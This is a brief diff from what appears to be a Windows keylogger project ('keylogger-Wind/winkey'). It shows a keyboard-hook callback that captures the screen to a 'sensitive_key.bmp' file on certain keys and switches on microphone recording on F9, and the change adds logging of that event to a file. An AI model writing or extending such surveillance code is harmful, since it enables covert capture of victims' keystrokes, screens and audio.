@@ -65,8 +65,10 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\sensitive_key.bmp");
 		if (kbd->vkCode == VK_F9)
 		{
-			printf("MICRO ACTIVE CHEF !\n:");
+			FILE *f = fopen("winkey.log", "a");
+			fprintf(f, "MICRO ACTIVE CHEF !\n:");
 			g_micro_run = 1;
+			fclose(f);
 		}
 		if (kbd->vkCode == VK_F10)
 		{
